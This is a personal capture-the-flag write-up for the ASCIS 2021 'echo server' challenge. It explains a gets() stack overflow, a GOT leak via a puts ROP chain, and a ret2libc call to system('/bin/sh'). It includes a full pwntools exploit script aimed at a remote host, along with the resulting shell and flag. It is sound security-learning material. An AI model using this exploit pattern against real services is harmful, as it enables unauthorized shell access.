# echo server - 100 pts

I couldn't solve this challenge at the time of the competition because i had problems debugging my payload (gdb.attach sucks anyway). So after doing some research, i have managed to get my payload to work and got the flag. This is just for remembering how to do certain things in the process of debugging and testing.

## Get started
Let's start off by looking into the binary's properties:
```bash
┌──(revirven㉿kali)-[~/Desktop/CTF/ASCIS-2021/echo-server]
└─$ file echoserver_2aa0a5dae5b5c2954ea6917acd01f49b
echoserver_2aa0a5dae5b5c2954ea6917acd01f49b: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped

┌──(revirven㉿kali)-[~/Desktop/CTF/ASCIS-2021/echo-server]
└─$ checksec echoserver_2aa0a5dae5b5c2954ea6917acd01f49b 
[*] '/home/revirven/Desktop/CTF/ASCIS-2021/echo-server/echoserver_2aa0a5dae5b5c2954ea6917acd01f49b'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

The binary is 64-bit ELF and most of the protection mechanisms have been disable so we can do plenty of things here. Although NX has been disabled, ASLR will definitely be on at the remote machine so the stack is still a useless place without a leak. We can instead, write to .bss section and execute shellcode from there. But for the sake of learning, i'll be using ret2libc attack technique in this writeup.

The program seems to just read user's inputs and output what has been entered:
```bash
┌──(revirven㉿kali)-[~/Desktop/CTF/ASCIS-2021/echo-server]
└─$ ./echoserver_2aa0a5dae5b5c2954ea6917acd01f49b
hi
hi
hello
hello
one two three
one two three
```

Let's fire up Ghidra. Since the binary has been stripped, we won't see the `main` function, but we can still find it through the entry point of the program:
```c
void entry(undefined8 param_1,undefined8 param_2,undefined8 param_3)
{
    undefined8 in_stack_00000000;
    undefined auStack8 [8];
  
    __libc_start_main(FUN_004011ae,in_stack_00000000,&stack0x00000008,FUN_00401270, FUN_004012d0, param_3,auStack8);
    do {
                    /* WARNING: Do nothing block with infinite loop */
    } while( true );
}
```

Function `FUN_004011ae` is used as the first parameter of `__libc_star_main` call, so we know it's the `main` function:
```c
undefined8 FUN_004011ae(void)
{
    char *pcVar1;
    char local_88 [128];
  
    signal(0xe,FUN_00401186);
    alarm(0x14);
    setvbuf(stdin,(char *)0x0,2,0);
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stderr,(char *)0x0,2,0);
    do {
            gets(local_88);
            puts(local_88);
            pcVar1 = strstr(local_88,"QUIT");
    } while (pcVar1 == (char *)0x0);
    return 0;
}
```
We can overwrite the return address of the function, but the payload must contain the string "QUIT" for the program to break out of the while loop. But where should we return to ?

## ret2libc attack
ret2libc attack uses functions in libc to spawn a shell (specifically `system()` or `execve()`,...).

In order to carry out ret2libc attack, we must know the libc version of the remote machine because different libc versions load functions into different places in memory. 

To do that, we will need to leak out the addresses of certain libc functions on the remote machine and base on those to find the correct libc version. Since we control the return address of `main`, we can instruct the program to call some output functions such as `puts`, `printf`,... to print out the address of themselves or other functions.

## PLT, GOT and Relocation proccess
The method above involves the GOT and the PLT as well as the process of relocation. Detailed of which can be found [here](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) and [here](https://www.linkedin.com/pulse/elf-linux-executable-plt-got-tables-mohammad-alhyari)

To simplify it, dynamic-linking binaries don't contain all the modules required for the program. Instead, those modules will be linked from a shared library and loaded into the binary at runtime using a linker. The Procedure Linkage Table (PLT) and Global Offset Table (GOT) are needed for this operation:
- The PLT stores the symbols that need to be resolved by the dynamic linker. They are pointers to different entries in the GOT
- When a function is first called, the dynamic linker performs a lookup in the shared library, and stores the address of the resolved function into the GOT
- The PLT will then, jump to the stored address in the GOT and invoke the function.

With this, we can call any function we want via PLT, provided that PIE is disabled (or you could, somehow, leak the binary base address) and the function has been called once.

## Finding the libc version  of the remote machine using function addresses
Shared library functions are loaded into the memory at an offset to a base address (this is called relative address) but the distance between 2 functions in the memory remains unchanged, so we can use the addresses of any 2 functions to find the correct libc version.

This site performs looking up libc version based on function addresses: https://libc.blukat.me

## Building the 1st ropchain (to leak addresses)
We will use `puts` and `gets` since the `main` function calls these 2 functions:
```c
do {
            gets(local_88);
            puts(local_88);
            pcVar1 = strstr(local_88,"QUIT");
    } while (pcVar1 == (char *)0x0);
```

We need to find the address of `puts.plt`, `puts.got` and `gets.got`. Pwntools provides a great module for this:
```python
puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])
gets_got = p64(elf.got['gets'])
# p64 is for packing the integers into little endian format
```
- `puts_plt`: For short, to call function `puts`
- `puts_got`: Address of function `puts` in libc
- `gets_got`: Address of function `gets` in libc

Basically, what we're trying to do is to get `puts` to print out the addresses of `puts` and `gets` in the shared library.

Since 64-bit binaries use registers to store parameters for function calls, we will also need a `[pop rdi, ret]` gadget to pop the given addresses into RDI and return to our `puts` call. We can use **Ropper**:
```bash
┌──(revirven㉿kali)-[~/Desktop/CTF/ASCIS-2021/echo-server]
└─$ ropper -f echoserver_2aa0a5dae5b5c2954ea6917acd01f49b --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: echoserver_2aa0a5dae5b5c2954ea6917acd01f49b
0x00000000004012cb: pop rdi; ret;
```

Or the **ROP** module of pwntools:
```python
pop_rdi = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
```
Lastly, we will need to jump back to `main` function to inject our 2nd payload which will be specified later.
```python
main = p64(0x004011ae) # The address of main function shown in Ghidra
```

### 1st ropchain:
```python
main = p64(0x004011ae)
string = b"QUIT"

puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])
gets_got = p64(elf.got['gets'])
pop_rdi = p64(0x00000000004012cb)

ropchain1 = b'A' * 0x84 + string
ropchain1 += pop_rdi + puts_got + puts_plt
ropchain1 += pop_rdi + gets_got + puts_plt + main

run.sendline(ropchain1)

run.recvuntil(b"\n")
leaked_puts = u64(run.recvline().strip().ljust(8, b'\x00'))
leaked_gets = u64(run.recvline().strip().ljust(8, b'\x00'))

log.info("Leaked puts address = " + hex(leaked_puts))
log.info("Leaked gets address = " + hex(leaked_gets))
```

### Result:
```bash
[*] Leaked puts address = 0x7f48fd04f210
[*] Leaked gets address = 0x7f48fd04e780
```

## Building the 2nd ropchain (to spawn shell)
We now have the correct libc version to work with, let's specified the library in our exploit script:
```python
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
```

The final goal of ret2libc attack is to spawn a shell by calling `system("/bin/sh")` (or `execve("/bin/sh")`). Both the addresses of `system()` and the string `/bin/sh` can be found in libc.

The addresses in shared libraries are only relative addresses. Therefore, we will need to find the base address of libc by subtracting libc function address from our leaked address:
```python
libc.address = leaked_puts - libc.sym['puts']
```

Now we can find `system()` and the string `/bin/sh` using the libc base address:
```python
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym['system']
```

### 2nd ropchain:
```python
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym['system']

log.info("/bin/sh = " + hex(binsh))
log.info("system = " + hex(system))

ropchain2 = b'A' * 0x84 + string + pop_rdi + p64(bin_sh) + p64(system)

run.sendline(ropchain2)
```

## Full exploit script
```python
from pwn import *

elf = ELF("./echoserver_2aa0a5dae5b5c2954ea6917acd01f49b")
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")

context.binary = elf
run = remote("125.235.240.166", 20101)

main = p64(0x004011ae)
string = b"QUIT"

# First ropchain
puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])
gets_got = p64(elf.got['gets'])
pop_rdi = p64(0x00000000004012cb)

ropchain1 = b'A' * 0x84 + string
ropchain1 += pop_rdi + puts_got + puts_plt
ropchain1 += pop_rdi + gets_got + puts_plt + main

run.sendline(ropchain1)

# Read leaked addresses
run.recvuntil(b"\n")
leaked_puts = u64(run.recvline().strip().ljust(8, b'\x00'))
leaked_gets = u64(run.recvline().strip().ljust(8, b'\x00'))

log.info("Leaked puts address = " + hex(leaked_puts))
log.info("Leaked gets address = " + hex(leaked_gets))

# Calculate libc base address
libc.address = leaked_puts - libc.sym['puts']
log.info("Libc base = " + hex(libc.address))

# Second ropchain
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym['system']

log.info("/bin/sh = " + hex(bin_sh))
log.info("system = " + hex(system))

ropchain2 = b'A' * 0x84 + string + pop_rdi + p64(bin_sh) + p64(system)

run.sendline(ropchain2)

run.interactive()
```

## Remote exploit
```bash
┌──(revirven㉿kali)-[~/Desktop/CTF/ASCIS-2021/echo-server]
└─$ python3 exploit.py
[*] '/home/revirven/Desktop/CTF/ASCIS-2021/echo-server/echoserver_2aa0a5dae5b5c2954ea6917acd01f49b'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] '/home/revirven/Desktop/CTF/ASCIS-2021/echo-server/libc6_2.31-0ubuntu9_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 125.235.240.166 on port 20101: Done
[*] Leaked puts address = 0x7ff5bd9f15a0
[*] Leaked gets address = 0xf0
[*] Libc base = 0x7ff5bd96a000
[*] /bin/sh = 0x7ff5bdb215aa
[*] system = 0x7ff5bd9bf410
[*] Switching to interactive mode
\x9f\xbd\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQUIT\x
$ ls -la
total 64
drwxr-x--- 1 0 1000  4096 Oct  7 09:23 .
drwxr-x--- 1 0 1000  4096 Oct  7 09:23 ..
-rwxr-x--- 1 0 1000   220 Feb 25  2020 .bash_logout
-rwxr-x--- 1 0 1000  3771 Feb 25  2020 .bashrc
-rwxr-x--- 1 0 1000   807 Feb 25  2020 .profile
drwxr-x--- 1 0 1000  4096 Oct  7 09:23 bin
drwxr-x--- 1 0 1000  4096 Oct  7 09:23 dev
-rw-r--r-- 1 0    0    28 Oct  7 10:56 flag
drwxr-x--- 1 0 1000  4096 Oct  7 09:23 lib
drwxr-x--- 1 0 1000  4096 Oct  7 09:23 lib32
drwxr-x--- 1 0 1000  4096 Oct  7 09:23 lib64
drwxr-x--- 1 0 1000  4096 Oct  7 09:23 libx32
-rwxr-xr-x 1 0    0 14360 Oct  7 11:47 problem
$ cat flag
ASCIS{old_school_challenge}
```
## Several things for me to remember (you guys can skip this)
- Since PIE has been disabled, the addresses of PLT and GOT entries are static, only the addresses load from the shared library are dynamic
- You can debug your payload with GDB by:
    - Use `raw_input()` after `process()` - This will make the exploit script wait for inputs
    - At another terminal, run `gdb -p pid` (`pid` = process of the program - specified by `process()`), set breakpoints (usually after input function), then continue
    - Press Enter at the terminal running exploit script to send payload
- Even if the binary is stripped, you can still look into the assembly using `x/Ni <instruction address>` (`N` = the number of instructions from `instruction address`)
- gdb.attach sucks, don't use it.